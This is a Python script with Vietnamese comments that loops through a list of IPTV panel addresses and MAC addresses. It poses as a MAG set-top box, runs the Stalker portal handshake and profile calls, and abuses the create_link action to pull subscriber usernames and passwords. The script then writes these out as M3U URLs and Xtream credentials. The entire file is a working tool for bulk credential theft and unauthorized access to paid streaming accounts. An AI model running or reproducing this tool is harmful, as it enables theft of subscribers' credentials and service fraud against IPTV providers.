import requests
import re
import os
import time

def get_xtream_info(panel, mac):
    session = requests.Session()
    headers = {
        "Host": panel,
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Cookie": f"mac={mac}; stb_lang=en; timezone=Europe%2FBerlin"
    }
    
    try:
        # Step 1: Handshake
        handshake_url = f"http://{panel}/portal.php?type=stb&action=handshake"
        res = session.get(handshake_url, headers=headers, timeout=15)
        token = res.json()['js']['token']
        
        # Step 2: Get profile
        headers["Authorization"] = f"Bearer {token}"
        profile_url = f"http://{panel}/portal.php?type=stb&action=get_profile"
        res = session.get(profile_url, headers=headers, timeout=15)
        play_token = res.json().get('play_token', '')
        
        # Step 3: Create link to extract credentials
        create_link_url = f"http://{panel}/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1&JsHttpRequest=1-xml"
        res = session.get(create_link_url, headers=headers, timeout=15)
        data = res.text
        
        # Extract username and password
        match = re.search(r'http://[^/]+/([^/]+)/([^/]+)/', data)
        if match:
            username = match.group(1)
            password = match.group(2)
            
            # Generate output formats
            m3u_url = f"http://{panel}/get.php?username={username}&password={password}&type=m3u_plus"
            xtream_code = f"{panel}|{username}|{password}"
            
            return {
                "m3u": m3u_url,
                "xtream": xtream_code,
                "username": username,
                "password": password
            }
    except Exception as e:
        return None
    
    return None

def process_mac_list(input_file="Mac_List.txt", output_file="Mac2Xtream.txt"):
    # Kiểm tra file đầu vào
    if not os.path.exists(input_file):
        print(f"❌ File đầu vào '{input_file}' không tồn tại!")
        return
    
    # Đọc danh sách MAC
    entries = []
    with open(input_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and "|" in line:
                panel, mac = line.split("|", 1)
                entries.append({"panel": panel.strip(), "mac": mac.strip()})
    
    if not entries:
        print(f"❌ Không tìm thấy dữ liệu hợp lệ trong file '{input_file}'")
        return
    
    # Xử lý từng mục
    success_count = 0
    total = len(entries)
    
    # Tạo file đầu ra
    with open(output_file, "w", encoding="utf-8") as out:
        out.write("═══ KẾT QUẢ CHUYỂN ĐỔI MAC/PANEL SANG XTREAM/M3U ═══\n")
        out.write(f"Tổng số mục cần xử lý: {total}\n")
        out.write(f"Thời gian bắt đầu: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out.write("═" * 60 + "\n\n")
    
    # Xử lý từng mục
    for i, entry in enumerate(entries, 1):
        panel = entry["panel"]
        mac = entry["mac"]
        
        print(f"\n[{i}/{total}] Đang xử lý: {panel} | {mac}")
        
        result = get_xtream_info(panel, mac)
        status = "✅ THÀNH CÔNG" if result else "❌ THẤT BẠI"
        
        # Ghi kết quả vào file
        with open(output_file, "a", encoding="utf-8") as out:
            out.write(f"╔════════════════════════════════════════════════╗\n")
            out.write(f"║ Mục #{i}: {status}\n")
            out.write(f"╠────────────────────────────────────────────────╣\n")
            out.write(f"║ Panel: {panel}\n")
            out.write(f"║ MAC: {mac}\n")
            
            if result:
                out.write(f"╠════════════════════════════════════════════════╣\n")
                out.write(f"║ 🔗 M3U URL: {result['m3u']}\n")
                out.write(f"║ 🔑 Xtream Code: {result['xtream']}\n")
                out.write(f"║ 👤 Username: {result['username']}\n")
                out.write(f"║ 🔒 Password: {result['password']}\n")
                success_count += 1
            else:
                out.write(f"║ ❌ Không thể trích xuất thông tin từ panel này\n")
            
            out.write(f"╚════════════════════════════════════════════════╝\n\n")
        
        # Hiển thị tiến trình
        progress = f"[{'=' * int(i/total*50)}{' ' * (50 - int(i/total*50))}] {i}/{total}"
        print(progress)
    
    # Tổng kết
    with open(output_file, "a", encoding="utf-8") as out:
        out.write("═" * 60 + "\n")
        out.write(f"Tổng kết:\n")
        out.write(f" - Tổng số mục: {total}\n")
        out.write(f" - Thành công: {success_count}\n")
        out.write(f" - Thất bại: {total - success_count}\n")
        out.write(f" - Tỷ lệ thành công: {success_count/total*100:.2f}%\n")
        out.write(f"Thời gian kết thúc: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out.write("═" * 60 + "\n")
    
    print(f"\n✅ Hoàn thành! Đã xử lý {total} mục")
    print(f"✅ Số mục thành công: {success_count}/{total}")
    print(f"📁 Kết quả đã được lưu vào: {output_file}")

# Main execution
if __name__ == "__main__":
    print("═══ CHƯƠNG TRÌNH CHUYỂN ĐỔI MAC/PANEL SANG XTREAM/M3U ═══")
    print("Đang đọc danh sách từ file Mac_List.txt...")
    
    # Xử lý file
    process_mac_list()
    
    print("\n═══ KẾT THÚC CHƯƠNG TRÌNH ═══")
